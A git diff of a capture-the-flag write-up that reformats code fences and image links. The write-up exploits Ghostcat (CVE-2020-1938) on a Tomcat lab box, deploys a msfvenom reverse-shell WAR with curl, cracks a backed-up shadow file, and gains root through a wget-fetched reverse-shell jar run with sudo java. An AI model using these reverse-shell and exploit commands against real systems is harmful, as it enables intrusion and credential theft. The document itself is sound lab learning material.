@@ -23,17 +23,21 @@ I tried to login to the /manager/ directory but it asked for username and passwo
 After searching a bit,I finally found a help 
 from my bestie-Google.I found a article about a exploit named **Ghostcat** CVE-2020-1938.
 
-```https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp```
+```
+https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp
+```
 
 Then,I searched for this exploit with searchsploit and look I found a python script:multiple/webapps/48143.py 
 
-![](/images/dotjar2.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar2.png)
 
 Finally I ran the python script.
 
-```python 48143.py <boxip>```
+```python
+python 48143.py <boxip>
+```
 
-![](/images/dotjar3.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar3.png)
 
 and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted. 
 
@@ -45,56 +49,60 @@ https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
 Reading this article I understood that we had to create a reverse shell and then upload it to port 8080.
 I also understood that the exploit must be a war file.Here's what I came up with msfvenom. 
 
-```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=1234 -f war > shell.war```
+```shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=1234 -f war > shell.war
+```
 
 Then, I uploaded it with curl command as follows
 
-``` curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war  "http://ip:8080/manager/text/deploy?path=/monshell"```
+```shell
+curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war  "http://ip:8080/manager/text/deploy?path=/monshell"
+```
 
 Listening to the given port,1234 as given in the exploit in this case,I opened the /monshell/ directory in which I had uploaded the shell.
 
 And,yes we get a shell and I was logged in as 'web'
 
-![](/images/dotjar5.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar5.png)
 
 After searching a bit we found a backup file of shadow in the /var/backups folder so we copied it to /tmp and gunzipped it to retrieve the shadow file.
 
-![](/images/jar.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar.png)
 
 Then we cracked the password hash for jdk-admin using john and logged in as jdk-admin
 
-![](/images/jar2.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar2.png)
 
 Now we can view the user flag..
 
-![](/images/jar3.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar3.png)
 
 After doing **sudo -l** we found that we have root permissions to run any java file.
 
-![](/images/jar4.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar4.png)
 
 So we created an exploit using msfvenom 
 
-```py
+```shell
 msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar
 
 ```
 Then i opened a http-server and transferred the payload to the shell using wget 
 
-![](/images/jar5.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar5.png)
 
-```py
+```shell
 python3 -m http.server 80
 wget <local ip>/pwn.jar --output-document=pwn.jar
 ```
 And opened a listening port 1234 in my terminal and ran the .jar file in the shell.Thus we got the root access 
 
-```py
+```shell
 sudo /usr/bin/java -jar pwn.jar
 ```
 Now we can view the root flag as well!!
 
-![](/images/jar6.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar6.png)
 
 
 
